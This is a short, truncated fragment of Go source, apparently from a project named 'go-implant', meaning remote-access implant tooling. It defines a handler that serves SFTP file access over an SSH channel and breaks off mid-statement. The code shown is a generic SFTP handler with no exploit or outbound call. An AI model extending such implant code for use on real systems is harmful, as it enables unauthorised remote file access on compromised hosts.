package ssh

import (
	"go-implant/client/config"
	"io"
	"log"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func handlesftp(channel ssh.Channel) {

	serverOptions := []sftp.ServerOption{}

	server, err := sftp.NewServer(
		channel,
		serverOptions...,
	)
	if err != nil {
		if config.DEBUG {
			log.Fatal(e